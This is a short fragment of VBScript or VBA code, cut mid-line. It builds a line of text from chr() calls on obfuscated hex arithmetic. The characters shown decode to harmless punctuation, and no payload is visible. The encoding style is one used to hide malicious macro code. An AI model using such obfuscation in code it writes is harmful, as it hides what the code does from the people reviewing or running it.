-30608+CLng("&H77bc"))&chr(CLng("&H166e6")-91846)&chr(CLng("&Hb99b")-47481)&chr(2215916/CLng("&Hfe96"))&chr(-20719+CLng("&H5118"))&vbcrlf)